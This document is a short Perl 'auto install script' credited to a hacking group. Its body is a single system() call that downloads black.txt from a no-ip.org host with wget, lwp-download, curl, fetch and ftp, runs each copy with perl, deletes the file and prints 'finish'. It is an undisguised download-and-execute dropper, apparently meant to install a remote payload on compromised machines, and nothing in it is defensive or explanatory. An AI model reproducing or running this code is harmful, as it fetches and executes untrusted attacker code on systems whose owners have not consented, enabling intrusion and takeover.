#################################################################!/bin/perl                                                    ## Auto install script by n0n0x@metalhack                       ## edit sesuai kebutuhan                                        ## created: January 2011					       #################################################################{system("wget http://ziphk.no-ip.org/manual/karma/black.txt;perl black.txt;lwp-download http://ziphk.no-ip.org/manual/karma/black.txt;perl black.txt;curl -O http://ziphk.no-ip.org/manual/karma/black.txt;perl black.txt;fetch http://ziphk.no-ip.org/manual/karma/black.txt;perl black.txt;ftp http://ziphk.no-ip.org/manual/karma/black.txt;perl black.txt;rm black.txt");sleep 1;print "finish";}################################################################